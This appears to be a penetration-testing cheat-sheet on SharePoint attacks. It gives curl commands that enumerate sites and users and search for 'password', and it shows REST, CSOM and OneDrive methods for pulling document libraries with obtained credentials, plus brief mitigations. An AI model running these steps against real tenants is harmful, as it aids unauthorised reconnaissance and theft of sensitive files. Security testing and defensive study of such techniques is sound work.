# SharePoint Attacks

_2 intranet payloads_

### SharePoint Enumeration  `sharepoint-enum`
_Enumerate SharePoint sites and files_
Subcategory: **Enumeration** · tags: `sharepoint` `enum` `recon`

**Prerequisites:**
- SharePoint is reachable

**Attack chain:**

**Site enumeration**
> Enumerate sites
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/webs
Get all subsites
```

**User enumeration**
> Enumerate users
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/siteusers
Get the list of site users
```

**File enumeration**
> Enumerate document libraries
_platform: linux_
```
curl -k https://sharepoint.com/_api/web/lists
Get the list of document libraries
```

**Search files**
> Search for sensitive content
_platform: linux_
```
curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
Search for sensitive files
```

**Overview:** The SharePoint REST API can be used for enumeration.

**Vulnerability principle:** The SharePoint API exposes excessive information.

**Exploitation method:** Exploitation flow: 1) Enumerate sites 2) Enumerate users 3) Search for sensitive files

**Mitigations:** Mitigations: 1) Restrict API access 2) Configure permissions 3) Monitor anomalous requests

---

### SharePoint File Access  `sharepoint-file-access`
_Access files in SharePoint document libraries_
Subcategory: **File Access** · tags: `sharepoint` `file` `access`

**Prerequisites:**
- SharePoint credentials or a vulnerability

**Attack chain:**

**Web interface access**
> Web interface access
```
https://sharepoint.com/sites/site_name/Shared Documents
Access the document library through a browser
Download sensitive files
```

**REST API access**
> REST API access
_platform: linux_
```
curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
Get the document list
Download file contents
```
**Syntax breakdown:**
- `_api/web/lists` — REST API endpoint _keyword_
- `getbytitle` — Get a list by name _keyword_

**CSOM access**
> CSOM access
_platform: windows_
```
Use the SharePoint Client Object Model:
ClientContext context = new ClientContext("https://sharepoint.com");
context.Credentials = new SharePointOnlineCredentials(user, password);
List list = context.Web.Lists.GetByTitle("Documents");
```

**OneDrive sync**
> OneDrive sync
```
Use the OneDrive client to sync a SharePoint document library
Access all files locally
View sensitive data offline
```

**Overview:** SharePoint files can be accessed in multiple ways.

**Vulnerability principle:** Once credentials are obtained, all authorized documents can be accessed.

**Exploitation method:** Exploitation flow: 1) Obtain credentials 2) Access the document library 3) Download sensitive files

**Mitigations:** Mitigations: 1) Least-privilege permissions 2) Monitor file access 3) Data classification protection

---
